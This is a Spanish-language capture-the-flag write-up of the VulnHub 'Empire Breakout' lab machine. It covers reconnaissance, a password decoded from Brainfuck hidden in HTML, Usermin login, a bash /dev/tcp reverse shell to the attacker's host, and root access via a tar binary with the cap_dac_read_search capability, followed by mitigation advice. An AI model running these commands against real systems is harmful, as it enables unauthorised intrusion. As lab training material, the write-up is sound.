# **CTF EMPIRE BREAKOUT**
OBJETIVO: 192.168.131.129 (Empire Breakout) <br>
 <br>
<div style="text-align: center;">
  <img src="https://raw.githubusercontent.com/Zyanetralys/profile/refs/heads/main/HD-wallpaper-star-wars-empire-battlefront-games-gaming-ps4-star-wars-starwars-xbox.jpg" width="550" alt="Star Wars Battlefront">
</div>
 <br>
## SECUENCIA DE ATAQUE <br>
 <br>
### FASE 1: PREPARACIÓN  <br>
mkdir ~/Desktop/vulnhub && cd ~/Desktop/vulnhub <br>
ping -c 4 192.168.131.129  # Verificación de conectividad <br>
Resultado: Objetivo accesible. <br>
 <br>
### FASE 2: RECONOCIMIENTO <br>
nmap -sC -sV -p- --open -oN escaneo 192.168.131.129 <br>
Puertos identificados: <br>
•	80/tcp - Apache httpd (página web) <br>
•	139/tcp - Samba smbd 4.6.2 <br>
•	445/tcp - Samba smbd 4.6.2 <br>
•	10000/tcp - MiniServ 1.981 (Webmin) <br>
•	20000/tcp - MiniServ 1.830 (Usermin) <br>
 <br>
### FASE 3: EXPLOTACIÓN INICIAL <br>
Análisis web: Navegador → http://192.168.131.129 <br>
•	Página Apache por defecto encontrada <br>
•	Inspección código fuente HTML <br>
 <br>
Extracción de credenciales: <br>
•	Comentario HTML: <!-- Don't worry this is safe to share with you, my access is encoded --> <br>
•	Código Brainfuck localizado al final del HTML <br>
•	Decodificación: decode.fr → Contraseña obtenida: .2uqPEfj3D<P'a-3 <br>
 <br>
echo ".2uqPEfj3D<P'a-3" > clave  # Almacenamiento seguro <br>
 <br>
Enumeración de usuarios: <br>
enum4linux -a 192.168.131.129 <br>
Usuario identificado: cyber <br>
 <br>
### FASE 4: ACCESO INICIAL <br>
 <br>
Autenticación: <br>
•	Panel Usermin: https://192.168.131.129:20000 <br>
•	Credenciales: cyber / .2uqPEfj3D<P'a-3 <br>
•	ACCESO CONCEDIDO <br>
 <br>
Primera flag: <br>
ls          # Exploración directorio <br>
cat user.txt # Flag user obtenida <br>

### FASE 5: SHELL REVERSA <br>
Preparación listener: <br>
ifconfig                    # IP local: 192.168.0.11 <br>
nc -lvp 443                # Listener puerto 443 <br>

Ejecución desde Command Shell del panel: <br>
bash -i >& /dev/tcp/192.168.0.11/443 0>&1 <br>
Shell reversa establecida como usuario cyber <br>
 <br>
### FASE 6: ESCALADA DE PRIVILEGIOS <br>
 <br>
Enumeración de privilegios: <br>
sudo -l                     # Sin resultados <br>
getcap -r / 2>/dev/null    # CRÍTICO: /home/cyber/tar cap_dac_read_search=ep <br>
 <br>
Identificación objetivo: <br>
cd /var/backups <br>
ls -la                     # Archivo: .old_pass.bak (propiedad root) <br>
 <br>
Explotación capabilities: <br>
cd /home/cyber <br>
./tar -cf clave.tar /var/backups/.old_pass.bak  # Compresión con capabilities <br>
tar -xvf clave.tar                              # Extracción <br>
cd var/backups <br>
cat .old_pass.bak                               # Contraseña root: Ts&4&YurgtRX(=~h <br>
 <br>
Escalada final:
su root                    # Password: Ts&4&YurgtRX(=~h <br>
script /dev/null -c bash   # Estabilización shell <br>
cd /root <br>
cat root.txt              # Flag root obtenida <br>
 <br>
## VULNERABILIDADES CRÍTICAS EXPLOTADAS <br>
 <br>
### CREDENCIALES EN CÓDIGO FUENTE <br>
•	Vector: Contraseña Brainfuck en HTML <br>
•	Impacto: Acceso directo a panel administrativo <br>
•	Criticidad: MÁXIMA <br>
 <br>
### CAPABILITIES MAL CONFIGURADAS <br>
•	Vector: CAP_DAC_READ_SEARCH en binario tar <br>
•	Impacto: Lectura arbitraria de archivos sistema <br>
•	Criticidad: ALTA <br>
 <br>
### ARCHIVO BACKUP CONTRASEÑA ROOT <br>
•	Vector: /var/backups/.old_pass.bak <br>
•	Impacto: Escalada directa privilegios root <br>
•	Criticidad: MÁXIMA <br>
 <br>
### PANEL ADMINISTRATIVO EXPUESTO <br>
•	Vector: Usermin puerto 20000 sin restricciones <br>
•	Impacto: Superficie ataque administrativa <br>
•	Criticidad: MEDIA <br>
 <br>
## HERRAMIENTAS EMPLEADAS <br>
Reconocimiento: nmap, navegador web <br>
Enumeración: enum4linux, decode.fr <br>
Acceso: Panel web Usermin <br>
Persistencia: Netcat (shell reversa) <br>
Escalada: getcap, tar (capabilities) <br>
 <br>
## MEDIDAS DE MITIGACIÓN <br>
 <br>
### CRÍTICAS (0-24 horas) <br>
•	Eliminar credenciales de código fuente HTML <br>
•	Remover capability CAP_DAC_READ_SEARCH del binario tar <br>
•	Eliminar archivo /var/backups/.old_pass.bak <br>
•	Cambiar contraseña root inmediatamente <br>
 <br>
### URGENTES (24-72 horas) <br>
•	Restringir acceso paneles Webmin/Usermin por IP <br>
•	Auditar todos binarios con capabilities especiales <br>
•	Revisar ubicaciones backup archivos sensibles <br>
 <br>
### IMPORTANTES (1-2 semanas) <br>
•	Implementar gestión segura secretos <br>
•	Configurar monitoreo accesos administrativos <br>
•	Establecer proceso revisión código fuente <br>
 <br>
## EVIDENCIAS <br>
•	Flag Usuario: Capturada desde /home/cyber/user.txt <br>
•	Flag Root: Capturada desde /root/root.txt <br>
•	Credenciales: Usuario 'cyber' y contraseña root documentadas <br>
•	Archivos: Escaneo nmap y evidencias almacenadas en ~/Desktop/vulnhub/ <br>
 <br>
## EVALUACIÓN <br>
•	TIEMPO: 45 minutos <br>
•	DIFICULTAD: Baja <br>
•	DETECCIÓN: No <br>
•	El objetivo presenta varios vectores de ataque de nivel crítico que facilitan comprometerla rápidamente, destacando la combinación de credenciales expuestas y configuraciones inseguras. <br>
 <br>
## MV <br>
https://www.vulnhub.com/entry/empire-breakout,751/ <br>
